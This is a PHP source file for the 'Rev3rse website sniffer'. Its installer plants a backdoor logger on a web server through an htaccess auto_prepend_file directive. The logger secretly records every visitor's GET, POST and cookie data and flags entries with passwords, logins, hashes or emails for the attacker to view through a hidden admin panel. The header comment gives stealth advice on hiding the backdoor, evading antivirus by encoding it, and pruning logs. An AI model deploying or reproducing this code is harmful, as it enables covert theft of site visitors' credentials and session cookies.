<?php/*


rev3rse.org~


Rev3rse website sniffer by Rev3rse aka -null-

Greets to r0x | mad-hatter | Dasteem | TriCk | led-zepellin | curfew | heats1nk | ninja


Great big fuck you to the following


n00bhax0r | Diesel | 0ni | prodigy

This is only a beta version and I will improve its functionality as development continues.


If you appreciate my work and would like to contribute, I dont take donations but would 
appreciate it if you took that donation and gave it to a less fortunate person.
No matter how small or how big anything is enough, be it food or water, money or shelter
all is good and I am happy with that. Thanks heaps If you do the above.


Also there is browser compatability issues with the log manager.


Firefox	 COMPATABLE
OPERA	 COMPATABLE	-	Doesn't display the top / bottom borders
Internet explorer	 COMPATABLE
CHROME	 UNTESTED






~rev3rse



Requirements
Write access to a htaccess file to allow itself to be run
Write access to a directory. I recomend using the /tmp/ dir
php_value auto_prepend_file Must be enabled. Else use include(), require(), require_once(), eval + redfile() or file_get_contents or main() or what ever you like.




Quick instructions






Install Directory. This is where to install the logger file and logs directory inside of.
Backdoor name. This is what to name the logger file, can be anything no extension name is required.
Htaccess path.	 This is the htaccess to use to write to.
Logs directory.	 This is the directory inside of the install dir that will hold the logs.
Logs extension. This is the extension to append to file names for logs. eg logname-date-w-e.txt
Key 1. Just leave this unless your a developer or something.
Seperator 2.	 Just leave this unless your a developer or something.
Seperator 3.	 Just leave this unless your a developer or something.
Log database: Main	 Database records for all logs sensitive and not.
Log database: Secure	 Database records for only sensitive logs.


Upon installing, go to any affected files inside of the directory of the backdoored htaccess, like index.php?act=v to view logs




$phrases	 =	 \"Your|prases|to|filter|inside|pipe|symbol|without|t hese|slashes\";
################################################## ###############################################
#	 Tips and other shit	 #
#	 #
#	 #
#	 #
#	 Stealth on unix	 #
#	 #
#	 Install to the /tmp/ dir	 #
#	 #
#	 Install to the /tmp/ directory and use a subdirectory.	 #
#	 MD5 hash the name to fit in with other directories from PHP sessions.	 #
#	 Example: /tmp/012345f3fda86e428ccda3e33d207217665201/	 #
#	 #
################################################## ###############################################
#	 #
#	 #
#	 Stealth on windows	 #
#	 #
#	If possible try install to the catroot directory (C:/windows/system32/catroot)	 #
#	If that doesnt work you can also try a users temporary directory. Preferably Guest account.	#
#	I have put below the directories for user directories as the differ on anything above XP	#
#	 #
#	Windows Vista or newer: c:/users/USERNAME/AppData/	 #
#	 #
#	For windows Vista/7 there is 3 directories inside the AppData folder by default	 #
#	Local, LocalLow	& Roaming. For stealth use local. For less chance of having your backdoor	#
#	removed when a user clears their temporary directory, use Roaming, and try to use the	 #
#	Guest	/	Public user account directory.	 #
#	 #
#	 #
#	Windows XP & lower: c:/documents and settings/USERNAME/ApplicationData	 #
#	 #
#	For stealth use the directory 'local'. For less chance of having your backdoor	 #
#	removed when a user clears their temporary directory, use Roaming, and try to use the	 #
#	Guest account directory.	 #
#	 #
#	 #
################################################## ###############################################
#	 #
#	 #
#	 Stealth through encoding	 #
#	 #
#	 Using encoding on your logs such as base64 or rot13 makes it harder for #
#	 Your logs and backdoor harder too be found. Example: grep will not detect	 #
#	 search strings in a base 64 encoded file except for any non-encoded data	 #
#	 such as file names and PHP opening tags etc. Encoding the php files also #
#	 stops most anti-virus softwares from detecting the php files from the backdoor	 #
#	 should it ever become detected by security softwares.	 #
#	 #
#	 #
################################################## ###############################################
#	 #
#	 #
#	 Log	build up	 #
#	 #
#	 After quite a while your logs directory & database will become quite large and	 #
#	 easy to find via file size sorts etc. Clear your logs regularly for extra stealth.	 #
#	 #
#	 In later versions of this script I will provide a pruning function.	 #
#	 #
#	 #
################################################## ###############################################
*/








error_reporting(0);
$data = stripslashes('<?php




// config


$logs_dir	 =	 \'__LOGS_TO__\';
$install_dir	 =	 \'__INSTALL_TO__\';
$log_ext	 =	 \'__LOG_EXT__\';
$key	 =	 \'__KEY__1\';
$seperator	 =	 \'__SEP__1\';
$seperator2	 =	 \'__SEP__2\';
$time	 =	 date(\'d-m-y\') . \" @ \" . date(\"h:i A\");
$format	 =	 $_SERVER[\'REMOTE_ADDR\'];
$request	 =	 $_SERVER[\"SERVER_NAME\"] . $_SERVER[\'REQUEST_URI\'];
$name	 =	 str_replace(\".\", \"_\", $format) . \'-\' . date(\'h-i-s\') . \'-\' . rand(\'0000\', \'9999\') . $log_ext;
$act	 =	 @$_GET[\'act\'];
$limit	 =	 @$_GET[\'l\'];
$db_name	 =	 \'__ADB__\';
$s_db_name	 =	 \'__SDB__\';
$db_l	 =	 \"$install_dir/$logs_dir/$db_name\";
$db_s	 =	 \"$install_dir/$logs_dir/$s_db_name\";
$phrases	 =	 \"pass|login|name|pw|hash|member|uname|priv|mail\";
error_reporting(0);	 // Leave this for stealth
if(@$limit != \'\') {
$limit = 0;
}
if($act == \'t\') {
echo \'Success1982Rev3rse\';
exit();
}


// incase of relocation or manual install
if(!file_exists($install_dir)) {
mkdir($install_dir);
}
if(!file_exists($install_dir . \"/$logs_dir\")) {
mkdir($install_dir . \"/$logs_dir\");
}










if(@$act != \'v\' && $act != \'vl\') {






// you need to add the get uri to allow url info for logs


// start sniffing the data


// bugfix because php doesnt check if the file is in use, and may overwrite the database with blank data
$start	 =	 0;
$end	 =	 990000;
while($start < $end) {
$start++;
}


if(!file_exists($db_l)) {
$mode	 =	 \'w\';
} else {
$mode	 =	 \'a\';
}
$b4 = @file_get_contents($db_l);
// add record to database
$record = fopen($db_l, \'w\');
$rec = explode(\'.\', $name);








fwrite($record, \"$rec[0]
$b4\");
fclose($record);
unset($mode);




if(!file_exists($install_dir . \'/logs/\' . $name)) {
$mode	 =	 \'w\';
} else {
$mode	 =	 \'a\';
}


$s_check	 =	 \'\';
// open the log file, or create it...


$log_2 = fopen($install_dir . \"/$logs_dir/\" . $name, $mode);
$rand = rand(\'000\', \'9999\');
fwrite($log_2, \"$request$key$format$key$time$key\");


// Log the data to a file
// GET data 
foreach($_GET as $get_name => $get_data) {
$s_check	 =	 \"$s_check . $get_name$seperator2$get_data$seperator\";
fwrite($log_2, \"$get_name$seperator2$get_data$seperator\");
}
fwrite($log_2, \"$key\");
$s_check	 =	 $s_check . $key;
// POST data
foreach($_POST as $post_name => $post_data) {
$s_check	 =	 \"$s_check . $post_name:$post_data$seperator\";
$posted	 =	 \'t\';


fwrite($log_2, \"$post_name$seperator2$post_data$seperator\");
}




fwrite($log_2, \"$key\");
$s_check	 =	 $s_check . $key;


// COOKIE data


foreach($_COOKIE as $cookie_name => $cookie_data) {
$s_check	 =	 \"$s_check . $cookie_name:$cookie_data$seperator\";
$cookies	 =	 \'t\';
fwrite($log_2, \"$cookie_name$seperator2$cookie_data$seperator\");
}


fwrite($log_2, \"$key\");
$s_check	 =	 $s_check . $key;
fclose($log_2);


// if the data is sensitive, add a second record to the sensitive records database.
// The reason for this is because it makes the sensitive sort much quicker when you have a large amount of database records ( several thousand )
if(@eregi($phrases, $s_check)) {


if(!file_exists($db_s)) {
$mode	 =	 \'w\';
} else {
$mode	 =	 \'a\';
}
$b4 = @file_get_contents($db_s);
// add record to database
$record = fopen($db_s, \'w\');
$rec = explode(\'.\', $name);
fwrite($record, \"$rec[0]
$b4\");
fclose($record);
unset($mode);
}
}
unset($time);
if(@$act == \'v\') {


// log export






$dlf	 =	 @str_replace(\'..\', \'\', $_GET[\'dl\']);
$file	 =	 \"$install_dir/$logs_dir/$dlf$log_ext\";




$type	 =	 @$_POST[\'fmt\'];
if($dlf != \'\') {


$dldata	 =	 file_get_contents($file);



header(\"Cache-Control: no-cache\");
header(\"Expires: -1\");
header(\"Content-Type: application/force-download\");
header(\"Content-Transfer-Encoding: binary\");
header(\"Content-Disposition: attachment; filename=$dlf$log_ext\");




if($type == \'1\') {
// raw download


echo $dldata;


}
if($type == \'2\') {
// parse into txt format


// this is for data that contains new lines, returns etc, ,most likely post data that will screw up the tab indenting :)
$multiline	 =	 array();




// GET parse
$gett	 =	 0;
list($site, $ip, $time, $get, $post, $cookie) = explode(\"$key\", $dldata);


$gets	 =	 explode($seperator, $get);


foreach($gets as $get) {
$gets2	 =	 explode($seperator2, $get);
if(@$gets2[0] != \'\') {
$gett++;
$last	=	$gets2[0];
$last2	=	$gets2[1];










$count	 =	 strlen($gets2[0]);


if($count < 5) {
$tabs = \'	 \';
}
if($count > 5 && $count < 9) {
$tabs = \'	 \';
}
if($count > 9 && $count < 20) {
$tabs = \'	 \';
}
if($count > 20 && $count < 28) {
$tabs = \'	 \';
}
if($count >= 35) {
$tabs = \'	\';
}
if($count == 10) {
$tabs = \'	 \';
}
if($count == 9) {
$tabs = \'	 \';
}
if($count == 4) {
$tabs = \'	 \';
}
if($count == 5) {
$tabs = \'	 \';
}


if(@eregi(\'
\', $gets2[1])) {
$multiline[]	 =	 \"GET $gets2[0]:


$gets2[1]
\";
} else {






echo \"GET $gets2[0]:$tabs$gets2[1]
\";
}
}
}


// POST parse
$postt	 =	 0;
$posts	 =	 explode($seperator, $post);


foreach($posts as $post) {


$posts2	 =	 explode($seperator2, $post);
if(@$posts2[0] != \'\') {
$postt++;
$last	=	$posts2[0];
$last2	=	$posts2[1];










$count	 =	 strlen($posts2[0]);


if($count < 5) {
$tabs = \'	 \';
}
if($count > 5 && $count < 9) {
$tabs = \'	 \';
}
if($count > 9 && $count < 20) {
$tabs = \'	 \';
}
if($count > 20 && $count < 28) {
$tabs = \'	 \';
}
if($count >= 35) {
$tabs = \'	\';
}
if($count == 10) {
$tabs = \'	 \';
}
if($count == 9) {
$tabs = \'	 \';
}
if($count == 4) {
$tabs = \'	 \';
}
if($count == 5) {
$tabs = \'	 \';
}




if(@eregi(\'
\', $posts2[1])) {
$multiline[]	 =	 \"POST $posts2[0]:


$posts2[1]
\";
} else {




echo \"POST $posts2[0]:$tabs$posts2[1]
\";
}
}
}




// COOKIE parse
$cookiet	 =	 0;
$cookies	 =	 explode($seperator, $cookie);


foreach($cookies as $cookie) {
$cookies2	 =	 explode($seperator2, $cookie);


if(@$cookies2[0] != \'\') {
$cookiet++;




$count	 =	 strlen($cookies2[0]);


if($count < 5) {
$tabs = \'	 \';
}
if($count > 5 && $count < 9) {
$tabs = \'	 \';
}
if($count > 9 && $count < 20) {
$tabs = \'	 \';
}
if($count > 20 && $count < 28) {
$tabs = \'	 \';
}
if($count >= 35) {
$tabs = \'	\';
}
if($count == 10) {
$tabs = \'	 \';
}
if($count == 9) {
$tabs = \'	 \';
}
if($count == 4) {
$tabs = \'	 \';
}
if($count == 5) {
$tabs = \'	 \';
}


if(@eregi(\'
\', $cookies2[1])) {
$multiline[]	 =	 \"COOKIE $cookies2[0]:


$cookies2[1]
\";
} else {


echo \"COOKIE $cookies2[0]:$tabs$cookies2[1]
\";
}
}
}
foreach($multiline as $toolong) {


echo \"








Multi-line data:






$toolong
\";
}
}


exit();
}






























$exit	 =	 \'y\';


// vars, dont change


$start	 =	 @$_GET[\'begin\'];
$end	 =	 \'22\';
$to	 =	 $start + $end;
$db	 =	 @file($db_l);
$db_row	 =	 count($db);
$started	=	 $start;
$sort	 =	 @$_GET[\'sort\'];
$sort2	 =	 $sort;
$per	 =	 @$_GET[\'disp\'];
$limit	 =	 @$_GET[\'l\'];
$max	 =	 $limit + $end;
$info_s	 =	 $start + 1;
$s_count	=	 @count(file($db_s));
$s_listed	=	 0;
$to_f	 =	 $start;
$cmd	 =	 @$_GET[\'c\'];
$log_file	=	 @$_GET[\'f\'];




if(!file_exists(\"$db_s\")) {
$s_count = 0;
}


if(!file_exists($db_l)) {
$db_row = 0;
$info_s = $info_s - 1;
}


if(@$to_f == \'\') {
$to_f = 0;
}








if(@$per != \'\') {


$started	=	 $db_row - $start;
$to	 =	 $per;
}


if(@$start == \'\') {
$started = 0;
}


// set the sort option


// default, most recent logs will be shown in descending order
if(@$sort	==	\'\') {
$sort	=	\'none\';
}


// URL/IP address search, addresses will be shown in alphabetical/numerical order
if(@$sort	==	\'u\') {
$sort	=	\'url\';
$text1	=	\'[ URL / SERVER ]&nbsp&nbsp&nbsp[X]\';
$link1	=	\'?act=v&begin=\';
} else {
$text1	=	\'[ URL / SERVER ]\';
$link1	=	\"?act=v&sort=u&begin=\";
}


// client ip sort, sort in decending/ascending order
if(@$sort	==	\'i\') {
$sort	=	\'i\';
$text2	=	\'[ CLIENT IP ]&nbsp&nbsp&nbsp[X]\';
$link2	=	\'?act=v&begin=\';
} else {
$text2	=	\'[ CLIENT IP ]\';
$link2	=	\"?act=v&sort=i&begin=\";
}


// GET data sort, logs containing GET data will be listed in most recent order
if(@$sort	==	\'g\') {
$sort	=	\'g\';
$text3	=	\'[ GET ]&nbsp&nbsp&nbsp[X]\';
$link3	=	\'?act=v&begin=\';
} else {
$text3	=	\'[ GET ]\';
$link3	=	\"?act=v&sort=g&begin=\";
}


// date sort
if(@$sort	==	\'t\') {
$sort	=	\'t\';
$text4	=	\'[ DATE ]&nbsp&nbsp&nbsp[X]\';
$link4	=	\'?act=v&begin=\';
} else {
$text4	=	\'[ DATE ]\';
$link4	=	\"?act=v&sort=t&begin=\";
}


// POST sort


if(@$sort	==	\'p\') {
$sort	=	\'p\';
$text5	=	\'[ POST ]&nbsp&nbsp&nbsp[X]\';
$link5	=	\'?act=v&begin=\';
} else {
$text5	=	\'[ POST ]\';
$link5	=	\"?act=v&sort=p&begin=\";
}


/// COOKIE sort
if(@$sort	==	\'c\') {
$sort	=	\'c\';
$text7	=	\'[ COOKIE ]&nbsp&nbsp&nbsp[X]\';
$link7	=	\'?act=v&begin=\';
} else {
$text7	=	\'[ COOKIE ]\';
$link7	=	\"?act=v&sort=c&begin=\";
}






// GET data sort, logs containing GET data will be listed in most recent order
if(@$sort	==	\'g\') {
$sort	=	\'g\';
}
// POST data sort, logs containing POST data will be listed in most recent order
if(@$sort	==	\'p\') {
$sort	=	\'p\';
}


// GET data sort, logs containing GET data will be listed in most recent order
if(@$sort	==	\'s\') {
$sort	=	\'sensitive\';
$text6	=	\'[ SENSITIVE ]&nbsp&nbsp&nbsp[X]\';
$link6	=	\'?act=v\';
} else {
$text6	=	\'[ SENSITIVE ]\';
$link6	=	\"?act=v&sort=s\";
}


// admin file








// set the layout


echo \"




<html>
<title>Rev3rse Website Sniffer</title>
<body bgcolor=\'#000000\'> 


<font color=\'#ffffff\' face=\'arial\' size=\'5\'>


\";








if(@$cmd == \'l\') {


$logf	=	$db[$log_file];
$log	=	@str_replace(\'
\', \'\', $logf);
echo $log . $log_ext;
$skip = 1;
}
















if(@$skip != 1) {
echo \"
<table style=\'border-collapse:collapse;\' width=\'100%\' border=\'1\' cellpadding=\'0\' cellspacing=\'0\'>
<tbody>
<tr>
<TD Width=\'10%\'><center><a href=\'\" . $link1 . \"$start\'\" . \" title=\'Sort logs by website and ip value\'><b><font color=\'#ffffff\' face=\'arial\' size=\'3\'>$text1</td>
<TD Width=\'10%\'><center><a href=\'\" . $link2 . \"$start\'\" . \" title=\'Sort logs by IP numerical value\'><b><font color=\'#ffffff\' face=\'arial\' size=\'3\'>$text2</td>
<TD Width=\'10%\'><center><a href=\'\" . $link4 . \"$start\'\" . \" title=\'Time\'><b><font color=\'#ffffff\' face=\'arial\' size=\'3\'>$text4</td>
<TD Width=\'10%\'><center><a href=\'\" . $link3 . \"$start\'\" . \" title=\'Only show logs that may contain GET information\'><b><font color=\'#ffffff\' face=\'arial\' size=\'3\'>$text3</td>


<TD Width=\'10%\'><center><a href=\'\" . $link5 . \"$start\'\" . \" title=\'Only show logs that may contain POST information\'><b><font color=\'#ffffff\' face=\'arial\' size=\'3\'>$text5</td>
<TD Width=\'10%\'><center><a href=\'\" . $link7 . \"$start\'\" . \" title=\'Only show logs that may contain cookie information\'><b><font color=\'#ffffff\' face=\'arial\' size=\'3\'>$text7</td>
<TD Width=\'10%\'><center><a href=\'\" . \"$link6\'\" . \"title=\'Only show logs that may contain sensitive information\'><b><font color=\'#ffffff\' face=\'arial\' size=\'3\'>$text6</td>
</tr>


\";
// Switch databases to show only sensitive records
if(@$sort == \'sensitive\') {
unset($db);
unset($db_row);
$db	 =	 file($db_s);
$db_row	 =	 count($db);
$sort	 =	 \'none\';
}
if(@$db_row < $end) {
$to	 =	 $start + $db_row;


}
if(@$sort == \'none\') {






while($started < $to) {
$log	=	@str_replace(\'
\', \'\', $db[$started]);
if(@$log != \'\') {


$data	=	file_get_contents($install_dir . \"/$logs_dir/\" . \"$log\" . \"$log_ext\");
if(@$data != \'\') {




list($site, $ip, $time, $get, $post, $cookie) = explode(\"$key\", $data);
/*if(@eregi(\'hthtp:\', $site)) {
$site1	=	\"$site/\";
list($one, $two, $site) = explode(\'/\', $site);
$site2 = \"$one//$site\";
}
*/
$site2	=	str_replace(\'http://\', \'\', $site);
$site2	=	explode(\'?\', $site2);
$site2	=	explode(\'&\', $site2[0]);
$site2	=	explode(\'/\', $site2[0]);
// shorten url!
$exps	=	0;
$site3	=	\'\';
foreach($site2 as $parse) {
if($exps > 0) {
$site3 = $site3 . \'/\' . $parse;
} else {
$exps++;
}
}




if(@$get == \'\') {
$g_yn	=	\'None\';
} else {
$g_yn	=	\'Yes\';
}
if(@$post == \'\') {
$p_yn	=	\'None\';
} else {
$p_yn	=	\'Yes\';
}
if(@$cookie == \'\') {
$c_yn	=	\'None\';
} else {
$c_yn	=	\'Yes\';
}
$length	 =	 strlen($site3);






// check the log for sensitive info
if(@eregi($phrases, $data)) {
$sensitive	=	\'Yes\';
$s_listed++;
$href	 =	 \"<a href=\'?act=vl&sort=s&lf=\" . $log . \"\' title=\'view log \" . $started . \"\'><font color=\'#ffffff\' face=\'arial\' size=\'3\'>\";
} else {
$sensitive	=	\'No\';
$href	 =	 \"<a href=\'?act=vl&lf=\" . $log . \"\' title=\'view log \" . $started . \"\'><font color=\'#ffffff\' face=\'arial\' size=\'3\'>\";
}


echo \"
<tr>
<TD Width=\'10%\'><center>$href$site3</a</td>


<TD Width=\'10%\'><font color=\'#ffffff\' face=\'arial\' size=\'3\'><center>$ip</td>
<TD Width=\'10%\'><font color=\'#ffffff\' face=\'arial\' size=\'3\'><center>$time</td>
<TD Width=\'10%\'><font color=\'#ffffff\' face=\'arial\' size=\'3\'><center>$g_yn</td>
<TD Width=\'10%\'><font color=\'#ffffff\' face=\'arial\' size=\'3\'><center>$p_yn</td>
<TD Width=\'10%\'><font color=\'#ffffff\' face=\'arial\' size=\'3\'><center>$c_yn</td>
<TD Width=\'10%\'><font color=\'#ffffff\' face=\'arial\' size=\'3\'><center>$sensitive</td>
\";
$to_f++;
}
}
$started++;
}


}


}


$drp	=	array();
$divide = $db_row / $end;
$nextp	=	$start + $end;
$prevp	=	$start - $end;
if($start == 0) {
$prevp = 0;
$prevlink	 =	 \"<b><font color=\'#7D7D7D\' face=\'arial\' size=\'3\'>[ < ]</a>\";
} else {
$prevlink	 =	 \"<a href=\'?act=v&sort=$sort2&begin=$prevp\' title=\'Go to previous page\'><b><font color=\'#ffffff\' face=\'arial\' size=\'3\'>[ < ]</a>\";
}
if($start > 1) {
$firstp	 =	 \"<a href=\'?act=v&sort=$sort2&begin=0\' title=\'Go to first page\'><b><font color=\'#ffffff\' face=\'arial\' size=\'3\'>[ << ]</a>\";
} else {
$firstp	 =	 \"<b><font color=\'#7D7D7D\' face=\'arial\' size=\'3\'>[ << ]</a>\";
}






$lcheck	= $db_row - $end;
if($start >= $lcheck) {
$nextp	=	$lcheck;
}


echo \"</table><center>


$firstp
$prevlink
\";
$count	 =	 \'\';
$page	 =	 \'\';
$drp[] = \"<option value=\'0\'>0</option>\";
while(@$count < $divide) {
if($count != \'\') {
$drp[] = \"<option value=\'\" . $page . \"\'>\" . $count . \"</option>
\";
}
@$page	 =	 $page + $end;
@$count++;
$checkl = $db_row - $page;






if(@$checkl < $end) {
$gg = $start + $end;
if($gg < $db_row) {
$lastpl	 =	 \"<a href=\'?act=v&sort=$sort2&begin=$page\' title=\'Go to last page\'><b><font color=\'#ffffff\' face=\'arial\' size=\'3\'>[ >> ]</a>\";
$nextpl	 =	 \"<a href=\'?act=v&sort=$sort2&begin=$nextp\' title=\'Go to next page\'><b><font color=\'#ffffff\' face=\'arial\' size=\'3\'>[ > ]</a>\";
} else {
$lastpl	 =	 \"<b><font color=\'#7D7D7D\' face=\'arial\' size=\'3\'>[ >> ]</a>\";
$nextpl	 =	 \"<b><font color=\'#7D7D7D\' face=\'arial\' size=\'3\'>[ > ]</a>\";
}


echo \"
$nextpl
$lastpl




<form method=\'get\' action=\'\'>
<select name=\'begin\' size=\'1\'>




\";
// quick bugfix for last page :(
$drp[]	=	\"<option value=\'\" . $page . \"\'>\" . $count . \"</option>\";
foreach($drp as $option) {
echo $option;
}


echo \"</select>
<input type=\'hidden\' name=\'sort\' value=\'$sort2\'>
<input type=\'hidden\' name=\'act\' value=\'v\'>
<input type=\'submit\' value=\'Go\'>
</form> \";
break(1);
}
}
}
if(@$act == \'vl\') {


$exit	 =	 \'y\';
unset($db);


// this is the log viewer....Fuck off and dont modify
if(@$sort2 == \'s\') {
$db	 =	 file($db_s);
$db_row	 =	 count($db);
} else {
$db	 =	 file($db_l);
$db_row	 =	 count($db);
}






echo \"


<body bgcolor=\'#000000\'> 


<table style=\'border-collapse:collapse;\' width=\'100%\' border=\'1\' cellpadding=\'0\' cellspacing=\'0\'>
<tbody>


<tr>


<TD><center><font color=\'#ffffff\' face=\'arial\' size=\'3\'>Log Viewer<br><br>




<form method=\'post\' action=\'?act=v&dl=\" . $_GET[\'lf\'] . \"\'>
<center>Export:
<select name=\'fmt\'>
<option value=\'2\'>TXT</option>
<option value=\'1\'>RAW</option>
</select>





<input type=\'submit\' value=\'Export\' />&nbsp;</form>




</table>










<table style=\'border-collapse:collapse;\' width=\'100%\' border=\'1\' cellpadding=\'0\' cellspacing=\'0\'>
<tbody>


<tr>




\";
















$id	 =	 $_GET[\'lf\'];
// bug fix, i really cant be bothered fixing it properly...too lazy as ive had enough of this project.
$id2	 =	 $id; // leave this + 1;
$lf	 =	 $id;
$log	=	@str_replace(\'
\', \'\', $lf);
$log	 =	 file_get_contents(\"$install_dir/$logs_dir/$lf\" . $log_ext);






// GET parse
$gett	 =	 0;
list($site, $ip, $time, $get, $post, $cookie) = explode(\"$key\", $log);


$gets	 =	 explode($seperator, $get);


foreach($gets as $get) {
$gets2	 =	 explode($seperator2, $get);
if(@$gets2[0] != \'\') {
$gett++;
$last	=	$gets2[0];
$last2	=	$gets2[1];
echo \"


<TD width=\'9999\'><center><font color=\'#ffffff\' face=\'arial\' size=\'3\'>GET: &nbsp &nbsp <b>$gets2[0]</td>


<TD width=\'10\'><center><font color=\'#ffffff\' face=\'arial\' size=\'3\'>
<textarea name=\'multi_line\' id=\'multi_line\' cols=\'140\' rows=\'1\'>$gets2[1]</textarea></td>
</tr>
\";
}


}




// POST parse
$postt	 =	 0;
$posts	 =	 explode($seperator, $post);


foreach($posts as $post) {


$posts2	 =	 explode($seperator2, $post);
if(@$posts2[0] != \'\') {
$postt++;
$last	=	$posts2[0];
$last2	=	$posts2[1];




echo \"


<TD width=\'9999\'><center><font color=\'#ffffff\' face=\'arial\' size=\'3\'>POST: &nbsp &nbsp <b>$posts2[0]</td>


<TD width=\'10\'><center><font color=\'#ffffff\' face=\'arial\' size=\'3\'>
<textarea name=\'multi_line\' id=\'multi_line\' cols=\'140\' rows=\'1\'>$posts2[1]</textarea></td>
</tr>






\";










}
// COOKIE parse
$cookiet	 =	 0;
$cookies	 =	 explode($seperator, $cookie);


foreach($cookies as $cookie) {
$cookies2	 =	 explode($seperator2, $cookie);


if(@$cookies2[0] != \'\') {
$cookiet++;
echo \"
<TD width=\'9999\'><center><font color=\'#ffffff\' face=\'arial\' size=\'3\'>COOKIE: &nbsp &nbsp <b>$cookies2[0]</td>


<TD width=\'10\'><center><font color=\'#ffffff\' face=\'arial\' size=\'3\'>
<textarea name=\'multi_line\' id=\'multi_line\' cols=\'140\' rows=\'1\'>$cookies2[1]</textarea></td>


</tr>






\";
}
}








































// ends here
// this makes for easy editing.
}






if(@$cmd == \'l\') {


$logf	=	$db[$log_file];
$log	=	@str_replace(\'
\', \'\', $logf);
echo $log . $log_ext;
$skip = 1;
}


}
if(@$cmd == \'l\') {


$footer_link = \"<font color=\'#ffffff\' face=\'arial\' size=\'3\'><center>[ Showing record $log_file of $db_row ] &nbsp&nbsp&nbsp [ $s_count Sensitive records <b>-</b> $s_listed in listing ]\";
} else {
if(@$sort2 == \'s\') {
$total_r	=	count(file($db_l));
$footer_link = \"<font color=\'#ffffff\' face=\'arial\' size=\'3\'><center>[ Total records $total_r ] &nbsp&nbsp&nbsp [ $s_count Sensitive records <b>-</b> $s_listed in listing ]\";
}
if(@$act == \'v\') {
$footer_link = \"<font color=\'#ffffff\' face=\'arial\' size=\'3\'><center>[ Showing records $info_s - $to_f of $db_row ] &nbsp&nbsp&nbsp [ $s_count Sensitive records <b>-</b> $s_listed in listing ]\";
}
if(@$act == \'vl\') {
$footer_link = \"<font color=\'#ffffff\' face=\'arial\' size=\'3\'><center>[ Viewing record ] &nbsp&nbsp&nbsp [ Sensitive: Yes ]\";
}
}






if(@$act == \'v\' || $act == \'vl\') {
// footer
echo \"</table></tr></td></table>


<br><br>
$footer_link
\";


}
if(@$exit == \'y\') {
echo \"\<center><a href=\'\http://rev3rse.org\'\ title=\'\Visit Us\'\><b><font color=\'\#ffffff\'\ face=\'\arial\'\ size=\'\3\'\><br><br>Rev3rse.org</font>\"\;
exit();
}
?>');
if($_POST['install'] != '') {


$data2 = str_replace('__INSTALL_TO__', $_POST['idir'], $data);
$data2 = str_replace('__LOG_EXT__', $_POST['lext'], $data2);
$data2 = str_replace('__KEY__1', $_POST['k1'], $data2);
$data2 = str_replace('__SEP__1', $_POST['sep1'], $data2);
$data2 = str_replace('__SEP__2', $_POST['sep2'], $data2);
$data2 = str_replace('__ADB__', $_POST['db1'], $data2);
$data2 = str_replace('__SDB__', $_POST['db2'], $data2);
$data2 = str_replace('__LOGS_TO__', $_POST['lto'], $data2);








$return2	 =	 getcwd();
$egcurr	 =	 str_replace('\\', '/', getcwd());
$egroot	 =	 str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']);
$egdir	 =	 str_replace($egroot, '', $egcurr);
$testrand	 =	 rand('000', '999');


if($_SERVER["SERVER_PORT"] == '80') {
$request	 =	 'http://' . $_SERVER["SERVER_NAME"];
} else {
$request	 =	 $_SERVER['SERVER_NAME'] . ':' . $_SERVER['SERVER_PORT'];
}
$getdir	 =	 "$request/" . $egdir;






// create the directory 
// designed this snippet quickly and hopefully flawlessly, am not perfecting it... not untill i have some time.




$dirs	 =	 explode('/', $_POST['idir']);


echo "
<title>Rev3rse Website Sniffer :: Installing</title>
<body bgcolor='#000000'> 
<font color='#ffffff' face='arial' size='3'>";


foreach($dirs as $dir) {
if(file_exists($dir)) {
$last = getcwd();
chdir($dir);
$new = getcwd();
if($new != $last) {
echo "<font size='3' color='#00B300'>[+]</font>chdir@$dir<br>";
}
} else {
if(!is_writable('.')) {
$last = getcwd();
die("
<font size='3' color='#CC0000'>[-]</font>Install failed... $last is not writable");
}
mkdir($dir);




chdir($dir);
$new = getcwd();
if($new != $last) {
echo "
<font size='3' color='#00B300'>[+]</font>mkdir $dir<br>
<font size='3' color='#00B300'>[+]</font>chdir@$dir<br>";
} else {
echo "
<font size='3' color='#00B300'>[-]</font>mkdir $dir<br>
<font size='3' color='#00B300'>[-]</font>chdir@$dir<br>";
}
}
}
$last = getcwd();




































$bdcf = fopen($_POST['fname'], 'w');
fwrite($bdcf, $data2);
fclose($bdcf);


$hta	 =	 $_POST['hta'] . '/.htaccess';


if(file_exists($hta)) {
$old = file_get_contents($hta);
if(!is_writable($hta)) {
die("
<font size='3' color='#CC0000'>[-]</font>Install failed... $hta is not writable<br>");
}
}










$testdir	 =	 $_POST['test_dir'];
$testdirr	 =	 "$testdir/$testrand";
$testdirrs	 =	 explode('/', $testdirr);
$htdata	 =	 'php_value auto_prepend_file ' . $_POST['idir'] . '/' . $_POST['fname'];
// begin test shit
if($_POST['method'] == '0') {


// here fuck this
chdir($testdir);
mkdir($testrand);
if(file_exists($testdirr)) {
echo "<font size='3' color='#00B300'>[+]</font>Create test directory @ $testdirr<br>";
$rmtestd	 =	 't';
file_put_contents($testdirr . '/.htaccess', $htdata);
file_put_contents($testdirr . '/index.php', "<?php echo 'rev3rse'; ?>");




if(file_exists($testdirr . '/index.php')) {
echo "<font size='3' color='#00B300'>[+]</font>Create test index @ $testdirr/index.php<br>";
} else {
echo "<font size='3' color='#CC0000'>[-]</font>Could not create test index @ $testdirr/index.php<br>";
}
if(file_exists($testdirr . '/.htaccess')) {


echo "<font size='3' color='#00B300'>[+]</font>Create test htaccess @ $testdirr/.htaccess<br>";
// check the directory here
$getl	 =	 str_replace('\n', '', "$getdir/$testrand");


$testrun	 =	 file_get_contents($getl);


$tries = 0;
while($tries < 3 && $testrun == '') {
$tries++;echo $tries;
$testrun	 =	 file_get_contents($getl);
}
if($testrun != '') {
if(@eregi('rev3rse', $testrun)) {


echo "<font size='3' color='#00B300'>[+]</font>Test Index working<br>";
} else {
echo "<font size='3' color='#CC0000'>[-]</font>Test Index working failed!<br>";
}
} else {
echo "<font size='3' color='#CC0000'>[-]</font>File_get_contents disabled?<br>";
}
} else {
echo "<font size='3' color='#CC0000'>[-]</font>Could not create test htaccess @ $testdir/htaccess<br>";
exit();
}
} else {
echo "<font size='3' color='#CC0000'>[-]</font>Could not create test directory @ $testdirr<br>";
exit();


}
}


if($rmtestd == 't') {
unlink("$testdirr/.htaccess");
unlink("$testdirr/index.php");
rmdir("$testdirr/");
if(file_exists("$testdirr/.htaccess")) {
echo "<font size='3' color='#CC0000'>[-]</font>Could not delete test .htaccess @ $testdirr/.htaccess<br>";
} else {
echo "<font size='3' color='#00B300'>[+]</font>Delete test .htaccess @ $testdirr/.htaccess<br>";
}
